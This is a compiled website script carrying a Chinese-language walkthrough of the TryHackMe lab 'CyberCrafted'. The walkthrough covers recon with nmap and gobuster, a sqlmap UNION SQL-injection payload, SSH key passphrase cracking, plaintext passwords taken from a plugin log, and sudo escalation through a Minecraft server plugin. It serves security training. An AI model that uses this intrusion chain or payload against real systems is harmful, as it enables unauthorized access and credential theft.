"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6290],{79544:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>d,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>c,toc:()=>o});var r=n(74848),s=n(28453);const a={sidebar_position:106,tags:["Easy","Linux","SQLI","\u547d\u4ee4\u6267\u884c","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"CyberCrafted",description:"CyberCrafted",sidebar_label:"CyberCrafted",slug:"/tryhackme/106"},i="CyberCrafted",c={id:"box/TryHackMe/106",title:"CyberCrafted",description:"CyberCrafted",source:"@site/docs/box/TryHackMe/106.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/106",permalink:"/docs/tryhackme/106",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u547d\u4ee4\u6267\u884c",permalink:"/docs/tags/\u547d\u4ee4\u6267\u884c"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:106,frontMatter:{sidebar_position:106,tags:["Easy","Linux","SQLI","\u547d\u4ee4\u6267\u884c","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"CyberCrafted",description:"CyberCrafted",sidebar_label:"CyberCrafted",slug:"/tryhackme/106"},sidebar:"boxSidebar",previous:{title:"The Great Escape",permalink:"/docs/tryhackme/105"},next:{title:"Nax",permalink:"/docs/tryhackme/107"}},d={},o=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; xxultimatecreeperxx",id:"www-data--xxultimatecreeperxx",level:3},{value:"xxultimatecreeperxx \u2014&gt; cybercrafted",id:"xxultimatecreeperxx--cybercrafted",level:3},{value:"cybercrafted  \u2014&gt; root",id:"cybercrafted---root",level:3},{value:"\u6559\u8bad",id:"\u6559\u8bad",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(t.h1,{id:"cybercrafted",children:"CyberCrafted"}),"\n",(0,r.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-157-48:~/cybercrafted# nmap -sTCV -p 22,80,25565 --min-rate 1000 10.10.177.157\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-22 01:47 BST\nNmap scan report for ip-10-10-177-157.eu-west-1.compute.internal (10.10.177.157)\nHost is up (0.00022s latency).\n\nPORT      STATE SERVICE   VERSION\n22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)\n|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)\n|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)\n80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to http://cybercrafted.thm/\n25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)\nMAC Address: 02:F3:76:CB:78:1D (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.24 seconds\n"})}),"\n",(0,r.jsx)(t.h2,{id:"80",children:"80"}),"\n",(0,r.jsxs)(t.p,{children:["\u56e0\u4e3a\u5728\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u65f6\u544a\u8bc9\u6211\u4e00\u4e2a\u57df\u540d: ",(0,r.jsx)(t.code,{children:"http://cybercrafted.thm/"}),", \u6240\u4ee5\u6211\u76f4\u63a5\u5f00\u59cb\u5b50\u57df\u626b\u63cf"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-157-48:~/cybercrafted# gobuster vhost -u  http://cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://cybercrafted.thm/\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2023/09/22 01:49:04 Starting gobuster\n===============================================================\nFound: admin.cybercrafted.thm (Status: 200) [Size: 937]\nFound: store.cybercrafted.thm (Status: 403) [Size: 287]\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u5728\u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u4e86\u4e24\u4e2a\u5b50\u57df, \u5f53\u7136\u6211\u4eec\u8fd8\u662f\u8981\u56de\u5230\u6211\u4eec\u7684\u4e3b\u7ad9\u8fdb\u884c\u89c2\u770b\u7684, \u5f53\u4f60\u67e5\u770b\u4e3b\u7ad9\u6e90\u4ee3\u7801\u4f60\u4f1a\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u6761\u63d0\u793a\u544a\u8bc9\u6211\u4eec\u6dfb\u52a0\u4e86\u5b50\u57df,\u867d\u7136\u8fd9\u65f6\u5019\u57fa\u672c\u653b\u51fb\u70b9\u5c31\u662f\u5b50\u57df\u4e86\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u8981\u8fdb\u884c\u76ee\u5f55\u7684\u626b\u63cf, \u6211\u5c31\u5168\u90e8\u626b\u63cf\u4e86,"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-157-48:~/cybercrafted# gobuster dir -u  http://cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://cybercrafted.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,html,php\n[+] Timeout:        10s\n===============================================================\n2023/09/22 01:51:11 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/assets (Status: 301)\n/secret (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/09/22 01:54:11 Finished\n===============================================================\nroot@ip-10-10-157-48:~/cybercrafted# gobuster dir -u  http://admin.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://admin.cybercrafted.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/22 01:54:29 Starting gobuster\n===============================================================\n/index.php (Status: 200)\n/login.php (Status: 302)\n/assets (Status: 301)\n/panel.php (Status: 302)\n/server-status (Status: 403)\n===============================================================\n2023/09/22 02:00:09 Finished\n===============================================================\nroot@ip-10-10-157-48:~/cybercrafted# gobuster dir -u  http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://store.cybercrafted.thm/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,php,txt\n[+] Timeout:        10s\n===============================================================\n2023/09/22 02:07:25 Starting gobuster\n===============================================================\n/index.html (Status: 403)\n/search.php (Status: 200)\n/assets (Status: 301)\n/server-status (Status: 403)\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u5bf9\u4e8e\u4e0a\u9762\u7684\u7ed3\u679c\u6765\u770b:"}),"\n",(0,r.jsxs)(t.ul,{children:["\n",(0,r.jsx)(t.li,{children:"\u4e3b\u7ad9 : \u4f30\u8ba1\u6ca1\u4e1c\u897f\u4e86, \u552f\u4e00\u53ef\u80fd\u7684 secret \u5c31\u662f\u51e0\u4e2a\u7167\u7247\u6211\u8fd8\u6000\u7591\u662f\u6587\u4ef6\u9690\u5199\u4f46\u662f\u60f3\u591a\u4e86"}),"\n",(0,r.jsx)(t.li,{children:"admin \u5b50\u57df : \u4e00\u4e2a\u767b\u9646\u7ad9\u70b9, \u4f30\u8ba1\u662f\u8981\u62ff\u5230\u767b\u9646\u5bc6\u7801\u4e4b\u7c7b\u7684\u5185\u5bb9, \u5c1d\u8bd5 sql \u6ce8\u5165\u65e0\u679c"}),"\n",(0,r.jsx)(t.li,{children:"store \u5b50\u57df : \u6709\u4e00\u4e2a\u641c\u7d22\u754c\u9762\u53ef\u80fd\u5b58\u5728 sql \u6ce8\u5165\u6f0f\u6d1e\u4e0b\u9762\u6211\u5c31\u8fdb\u884c\u4e86\u5c1d\u8bd5 (\u8fc7\u591a\u5185\u5bb9\u6211\u5c31\u4e0d\u5c55\u793a\u4e86, \u6700\u540e\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u767b\u9646\u6570\u636e\u5e93)"}),"\n"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-157-48:~/cybercrafted# sqlmap -r sql_store.txt  --dbms=mysql\n---\nParameter: search (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: search=12' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a7a71,0x75634f65566e5058566d4144785952757a58785a597963447252757a4b48457256467966696c4450,0x716a707a71),NULL-- tzLV&submit=\n---\n\n+----+------------------------------------------+---------------------+\n| id | hash                                     | user                |\n+----+------------------------------------------+---------------------+\n| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |\n| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |\n+----+------------------------------------------+---------------------+\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u5bf9\u4e8e\u4e0a\u9762\u5f97\u5230\u7684\u5bc6\u7801\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116.png",alt:"Untitled"})}),"\n",(0,r.jsx)(t.p,{children:"\u4e4b\u540e\u767b\u9646\u6211\u4eec\u7684 admin \u5b50\u57df\u53d1\u73b0\u8fdb\u5165\u4e00\u4e2a panel.php \u754c\u9762\u8fd9\u662f\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u9875\u9762"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-1.png",alt:"Untitled"})}),"\n",(0,r.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(t.h3,{id:"www-data",children:"www-data"}),"\n",(0,r.jsx)(t.p,{children:"\u5229\u7528\u4e0a\u9762\u5f97\u5230\u7684\u547d\u4ee4\u6267\u884c\u7a97\u53e3\u83b7\u53d6 Shell"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-2.png",alt:"Untitled"})}),"\n",(0,r.jsx)(t.h3,{id:"www-data--xxultimatecreeperxx",children:"www-data \u2014> xxultimatecreeperxx"}),"\n",(0,r.jsx)(t.p,{children:"\u6211\u53d1\u73b0\u5bf9\u4e8e xxultimatecreeperxx \u7528\u6237\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u5176 ssh \u7684\u79c1\u94a5"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"(remote) www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls -al\ntotal 16\ndrwxrwxr-x 2 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 .\ndrwxr-xr-x 5 xxultimatecreeperxx xxultimatecreeperxx 4096 Oct 15  2021 ..\n-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx  414 Jun 27  2021 authorized_keys\n-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 id_rsa\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u7ecf\u8fc7\u9a8c\u8bc1\u5b58\u5728\u5bc6\u7801, \u6240\u4ee5\u6211\u4f7f\u7528 john \u8fdb\u884c\u4e86\u5bc6\u7801\u7684\u7834\u89e3"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-157-48:~/cybercrafted# john hash.txt --wordlist=`locate rockyou.txt`\nNote: This format may emit false positives, so it will keep trying even after finding a\npossible candidate.\nWarning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"\nUse the "--format=ssh-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\ncreepin2006      (id_rsa)\n1g 0:00:00:22 DONE (2023-09-22 02:19) 0.04415g/s 633187p/s 633187c/s 633187C/s *7\xa1Vamos!\nSession completed.\n'})}),"\n",(0,r.jsx)(t.p,{children:"\u7136\u540e\u8fdb\u884c\u767b\u9646\u5373\u53ef"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-3.png",alt:"Untitled"})}),"\n",(0,r.jsx)(t.h3,{id:"xxultimatecreeperxx--cybercrafted",children:"xxultimatecreeperxx \u2014> cybercrafted"}),"\n",(0,r.jsx)(t.p,{children:"\u6211\u53d1\u73b0\u7528\u6237\u662f\u5c5e\u4e8e\u4e00\u4e2a\u7ec4\u7684, \u6240\u4ee5\u6211\u76f4\u63a5\u67e5\u627e\u5c5e\u4e8e\u8fd9\u4e2a\u7ec4\u7684\u6587\u4ef6"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"xxultimatecreeperxx@cybercrafted:~$ find / -group 25565 2>/dev/null\n/opt/minecraft\n/opt/minecraft/note.txt\n........\n/opt/minecraft/cybercrafted/plugins\n/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar\n/opt/minecraft/cybercrafted/plugins/LoginSystem\n/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml\n/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml\n/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt\n/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u67e5\u770b\u8fd9\u4e2a note.txt \u6587\u4ef6\u6211\u77e5\u9053\u4e86\u63d0\u4f9b\u4e86\u4e00\u4e2a Minecraft \u63d2\u4ef6, \u5e76\u4e14\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0a\u9762\u7684\u8f93\u51fa\u4e2d\u770b\u5230\u8fd9\u4e2a\u63d2\u4ef6\u5e76\u4e14\u5176\u540d\u79f0\u4e3a login \u6240\u4ee5\u5e94\u8be5\u548c\u767b\u9646\u6709\u5173\u6211\u4eec\u8fdb\u884c\u67e5\u770b"}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:"xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml \ncybercrafted: dcbf543ee264e2d3a32c967d663e979e\nmadrinch: 42f749ade7f9e195bf475f37a44cafcb\nxxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt \n\n[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock\n[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock\n[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock\n[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock\n[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!\n[2021/06/27 11:59:01] madrinch logged in. PW: Password123\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u8fd9\u91cc\u6cc4\u9732\u4e86\u7528\u6237 cybercrafted  \u7684\u5bc6\u7801, \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u6b64\u8fdb\u884c\u767b\u9646"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-4.png",alt:"Untitled"})}),"\n",(0,r.jsx)(t.h3,{id:"cybercrafted---root",children:"cybercrafted  \u2014> root"}),"\n",(0,r.jsx)(t.p,{children:"\u6211\u53d1\u73b0\u7528\u6237\u5177\u6709 sudo \u7279\u6743, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u6743\u9650\u5347\u7ea7"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-5.png",alt:"Untitled"})}),"\n",(0,r.jsxs)(t.p,{children:["\u7b80\u5355\u67e5\u770b\u5176\u529f\u80fd\u540e, \u6211\u610f\u8bc6\u5230\u6211\u4eec\u53ef\u80fd\u9700\u8981\u627e\u5230\u4e00\u4e2a\u63d2\u4ef6\u5e76\u5c06\u5176\u52a0\u8f7d\u5230\u670d\u52a1\u4e2d, \u8fdb\u884c\u5229\u7528, \u7ecf\u8fc7\u67e5\u627e\u6211\u53d1\u73b0\u4e86 ",(0,r.jsx)(t.a,{href:"https://github.com/Frazew/BukkitTTY",children:"https://github.com/Frazew/BukkitTTY"}),", \u56e0\u6b64\u5c06\u5176\u4e0b\u8f7d\u5e76\u4e0a\u4f20\u540e, \u6211\u4eec\u9700\u8981\u8fdb\u884c\u91cd\u65b0\u52a0\u8f7d\u4e4b\u540e\u6211\u4eec\u7684\u4e0a\u4f20\u7684\u63d2\u4ef6\u624d\u4f1a\u88ab\u52a0\u8f7d\u5230\u6211\u4eec\u7684\u7a0b\u5e8f\u5f53\u4e2d"]}),"\n",(0,r.jsx)(t.pre,{children:(0,r.jsx)(t.code,{className:"language-bash",children:">plugins # \u67e5\u770b\u5f53\u524d\u63d2\u4ef6\u5217\u8868\n[01:42:52 INFO]: Plugins (1): LoginSystem\n>reload  # \u91cd\u65b0\u52a0\u8f7d\u670d\u52a1\u5668\n......\n>plugins # \u67e5\u770b\u63d2\u4ef6\u5217\u8868\n[01:43:08 INFO]: Plugins (2): **BukkitTTY**, LoginSystem\n"})}),"\n",(0,r.jsx)(t.p,{children:"\u73b0\u5728\u6211\u4eec\u8f93\u5165 help \u6307\u4ee4\u5c31\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u65b0\u4e0a\u4f20\u7684\u547d\u4ee4\u4e86"}),"\n",(0,r.jsx)(t.p,{children:(0,r.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132116-6.png",alt:"Untitled"})}),"\n",(0,r.jsxs)(t.p,{children:["\u5f53\u7136\u4e5f\u8fd8\u6709\u6700\u7b80\u5355\u7684\u65b9\u6cd5, \u6211\u4eec\u53ea\u9700\u8981\u5728\u7a0b\u5e8f\u8fd0\u884c\u540e\u6267\u884c ",(0,r.jsx)(t.code,{children:"ctrl+a"})," \u548c ",(0,r.jsx)(t.code,{children:"ctrl+c"})," \u5373\u53ef"]}),"\n",(0,r.jsx)(t.h2,{id:"\u6559\u8bad",children:"\u6559\u8bad"}),"\n",(0,r.jsxs)(t.ol,{children:["\n",(0,r.jsx)(t.li,{children:"\u5728\u626b\u63cf\u5b50\u57df\u65f6, \u8bb0\u5f97\u5173\u6ce8\u4e0d\u540c\u7684\u72b6\u6001\u7801\u5bf9\u5e94\u7684\u60c5\u51b5, \u5e76\u79ef\u6781\u8fdb\u884c\u5206\u6790"}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,r.jsx)(t,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>c});var r=n(96540);const s={},a=r.createContext(s);function i(e){const t=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:t},e.children)}}}]);